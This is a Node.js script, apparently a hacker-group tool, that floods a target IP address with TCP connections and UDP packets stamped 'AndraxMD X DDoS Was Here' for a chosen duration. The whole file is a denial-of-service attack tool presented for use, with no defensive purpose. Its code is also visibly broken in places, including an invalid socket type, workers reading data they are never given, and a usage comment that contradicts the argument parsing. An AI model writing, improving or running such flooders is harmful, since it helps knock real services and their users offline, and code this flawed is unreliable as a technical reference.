// usage : node mix.js 124.125.12.123 53 22
const net = require('net');
const dgram = require('dgram');
const http = require('http');
const { Worker, isMainThread } = require('worker_threads');

// TCP Flood Worker
function tcpFloodWorker(target, port, duration) {
    let interval;

    interval = setInterval(() => {
        const client = new net.Socket();
        client.connect(port, target, () => {
            console.log(`TCP flood sent to ${target}:${port}`);
            client.end();
        });

        client.on('error', (err) => {
            console.error(`TCP flood error: ${err}`);
        });
    }, 10);

    setTimeout(() => {
        clearInterval(interval);
        console.log('TCP flood stopped.');
    }, duration * 1000);
}

// UDP Flood Worker
function udpFloodWorker(target, port, duration) {
    const client = dgram.createSocket('udp');
    let interval;

    client.on('error', (err) => {
        console.error(`UDP client error:\n${err.stack}`);
        client.close();
    });

    client.on('listening', () => {
        const address = client.address();
        console.log(`UDP flood sent to ${target}:${port}`);
    });

    client.bind();

    interval = setInterval(() => {
        const message = Buffer.from('AndraxMD X DDoS Was Here');
        client.send(message, port, target);
    }, 100);

    setTimeout(() => {
        clearInterval(interval);
        client.close();
        console.log('UDP flood stopped.');
    }, duration * 1000);
}

// Main function
function main() {
    if (isMainThread) {
        const target = process.argv[2]; // target IP address
        const duration = parseInt(process.argv[3], 10); // duration in seconds
        const tcpPort = parseInt(process.argv[4], 10); // TCP port
        const udpPort = parseInt(process.argv[5], 10); // UDP port

        if (!target || !duration || !tcpPort || !udpPort || isNaN(duration) || isNaN(tcpPort) || isNaN(udpPort)) {
            console.log('Usage: node mix.js <target_IP> <duration_seconds> <tcp_port> <udp_port>');
            process.exit(1);
        }

        const tcpWorker = new Worker(__filename);
        const udpWorker = new Worker(__filename);

        tcpWorker.postMessage({ target, port: tcpPort, duration });
        udpWorker.postMessage({ target, port: udpPort, duration });
    } else {
        // Worker thread logic
        const { parentPort, workerData } = require('worker_threads');

        const { target, port, duration } = workerData;

        if (port === process.argv[4]) {
            tcpFloodWorker(target, port, duration);
        } else if (port === process.argv[5]) {
            udpFloodWorker(target, port, duration);
        }
    }
}

main();